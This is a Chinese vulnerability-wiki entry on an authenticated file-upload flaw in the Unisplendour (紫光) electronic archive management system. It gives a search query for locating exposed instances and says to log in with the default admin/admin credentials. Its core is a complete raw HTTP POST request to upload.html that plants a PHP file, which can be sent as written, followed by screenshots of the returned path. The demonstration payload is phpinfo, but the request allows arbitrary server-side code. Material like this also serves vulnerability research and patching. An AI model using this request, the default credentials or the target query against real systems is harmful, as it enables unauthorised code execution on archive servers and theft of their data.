---
title: "紫光档案管理系统 upload.html 后台文件上传漏洞"
date: 2026-10-16 09:11:28
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "紫光档案管理系统"
tags:
  - "紫光档案管理系统"
  - "文件上传"
  - "信息泄露"
  - "弱口令"
  - "漏洞复现"
---
## 漏洞描述

紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统后台存在文件上传漏洞。攻击者可利用漏洞获取数据库敏感信息。

## 漏洞影响

```
紫光电子档案管理系统
```

## 网络测绘

```
app="紫光档案管理系统"
```

## 漏洞复现

登录页面

![image-20230314084520184](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084520184.png)

使用默认口令登录后台 admin/admin, 发送请求包

![image-20230314084534337](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084534337.png)

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1 HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 614
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygIRYWNxmDYiZBguT

------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name="userID"

admin
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name="fondsid"

1
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name="comid"

1
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name="token"

6b79a77180e9ec3a7ca351ebe54641a2
------WebKitFormBoundarygIRYWNxmDYiZBguT
Content-Disposition: form-data; name="files[]"; filename="phpinfo.php"
Content-Type: text/php

&lt;?php phpinfo();?&gt;
------WebKitFormBoundarygIRYWNxmDYiZBguT--</code></pre>

</details>

![image-20230314084553654](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084553654.png)

回显路径即为上传成功的文件路径

![image-20230314084608438](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230314084608438.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-upload.html-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
